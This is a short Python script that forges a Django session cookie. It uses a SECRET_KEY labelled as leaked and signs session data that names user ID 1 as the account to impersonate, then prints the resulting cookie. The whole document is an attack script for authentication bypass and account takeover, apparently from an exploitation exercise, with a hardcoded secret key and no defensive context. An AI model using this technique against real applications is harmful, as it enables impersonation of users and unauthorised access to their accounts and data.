import json
import base64
from django.core.signing import Signer

# The SECRET_KEY from the leaked settings
SECRET_KEY = 'django-insecure-+bnw67qdf-&yhxri&@@u9zeye3w)u^)v(^s!*b+$$niwef1*&i'

# Sample session data
session_data = {
    '_auth_user_id': '1',  # ID of the user to impersonate
    '_auth_user_backend': 'django.contrib.auth.backends.ModelBackend',
}

# Serialize and sign the session data
session_data_json = json.dumps(session_data)
session_data_encoded = base64.b64encode(session_data_json.encode()).decode()
signer = Signer(key=SECRET_KEY)
signed_session_data = signer.sign(session_data_encoded)

print(f'Session Cookie: {signed_session_data}')
